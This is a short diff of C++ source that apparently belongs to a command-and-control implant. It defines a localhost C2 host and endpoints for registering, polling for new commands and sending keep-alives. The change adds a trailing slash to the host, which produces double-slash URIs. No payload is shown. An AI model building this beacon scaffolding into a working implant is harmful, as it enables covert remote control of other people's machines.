@@ -13,7 +13,7 @@
 
 using json = nlohmann::json;
 
-#define C2_HOST "http://127.0.0.1:1234"
+#define C2_HOST "http://127.0.0.1:1234/"
 #define REGISTER_URI C2_HOST"/c2/register/"
 #define CHECK_NEW_CMD_URI C2_HOST"/c2/new_command/"
 #define KEEP_ALIVE_URI C2_HOST"/c2/keep_alive/"
